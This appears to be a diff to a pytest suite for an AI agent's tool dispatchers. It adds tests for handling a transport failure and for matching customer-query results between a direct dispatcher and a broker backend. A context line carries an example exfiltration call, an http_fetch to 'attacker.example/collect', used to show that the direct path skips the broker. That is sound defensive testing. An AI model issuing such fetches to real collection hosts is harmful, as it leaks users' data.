@@ -6,6 +6,8 @@ import pytest
 from agent.llm import Cassette
 from agent.loop import run_task
 from agent.tools import BrokeredDispatcher, DirectDispatcher
+from broker.backends import Backends
+from mocks.seed_db import seed_customers
 
 CASSETTE = [
     {"type": "tool_use", "tool": "read_document", "args": {"doc_id": "ticket-4711"}},
@@ -129,3 +131,39 @@ def test_direct_dispatcher_bypasses_the_broker_entirely(tmp_path):
     )
     dispatcher.call("http_fetch", {"url": "https://attacker.example/collect"})
     assert seen["url"] == "https://attacker.example/collect"
+
+
+def test_a_dispatcher_transport_failure_does_not_stop_the_loop(cassette):
+    class RaisingDispatcher:
+        def call(self, tool, args):
+            raise RuntimeError("connection refused")
+
+    transcript = run_task(RaisingDispatcher(), cassette, task_id="4711")
+    assert transcript[-1]["type"] == "final"
+
+
+def test_direct_dispatcher_matches_backends_for_the_same_filter(tmp_path):
+    db_path = tmp_path / "customers.db"
+    seed_customers(db_path, count=120)
+
+    def handler(request):
+        return httpx.Response(200, text="unused")
+
+    direct = DirectDispatcher(
+        docstore_url="http://docstore.internal",
+        db_path=db_path,
+        mailer_url="http://mailer.internal",
+        client=httpx.Client(transport=httpx.MockTransport(handler)),
+    )
+    backends = Backends(
+        docstore_url="http://docstore.internal",
+        db_path=db_path,
+        mailer_url="http://mailer.internal",
+        client=httpx.Client(transport=httpx.MockTransport(handler)),
+    )
+
+    for filter_expr in ("plan=pro", "id=8812"):
+        direct_result = direct.call("query_customers", {"filter": filter_expr})
+        backend_result = backends.execute("query_customers", {"filter": filter_expr})
+        assert json.loads(direct_result["content"]) == json.loads(backend_result.content)
+        assert direct_result["rows"] == backend_result.rows
